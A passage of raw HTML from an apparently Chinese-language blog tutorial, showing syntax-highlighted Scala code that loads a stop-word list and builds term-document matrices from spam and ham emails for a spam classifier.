&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061349295913129-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061349295913129-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061349295913129-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061349295913129-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061349295913129-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061349295913129-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061349295913129-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061349295913129-8&quot;&gt;8&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061349295913129-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061349295913129-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061349295913129-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061349295913129-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/Users/.../.../Example Data/stopwords.txt&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;latin1&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061349295913129-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mkString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061349295913129-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061349295913129-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061349295913129-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0017 seconds] --&gt;
&lt;p&gt;现在我们可以扩展前文中的 TDM 生成代码，剔除停用词：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06134c259180377&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val stopWords = getStopWords

val spamTDM  = spamMails
      .flatMap(email =&amp;gt; email
      ._2.split(&quot; &quot;)
      .filter(word =&amp;gt; word.nonEmpty &amp;amp;&amp;amp; !stopWords.contains(word))
      .map(word =&amp;gt; (email._1.getName,word)))
      .groupBy(x =&amp;gt; x._2)
      .map(x =&amp;gt; (x._1, x._2.groupBy(x =&amp;gt; x._1)))
      .map(x =&amp;gt; (x._1, x._2.map( y =&amp;gt; (y._1, y._2.length))))
      .toList


 val hamTDM  = hamMails
      .flatMap(email =&amp;gt; email
      ._2.split(&quot; &quot;)
      .filter(word =&amp;gt; word.nonEmpty &amp;amp;&amp;amp; !stopWords.contains(word))
      .map(word =&amp;gt; (email._1.getName,word)))
      .groupBy(x =&amp;gt; x._2)
      .map(x =&amp;gt; (x._1, x._2.groupBy(x =&amp;gt; x._1)))
      .map(x =&amp;gt; (x._1, x._2.map( y =&amp;gt; (y._1, y._2.length))))
      .toList&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06134c259180377-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06134c259180377-22&quot;&gt;22&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStopWords&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamTDM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spamMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;flatMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-13&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-14&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamTDM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;hamMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06134c259180377-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;flatMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06134c259180377-16&quot;&gt;
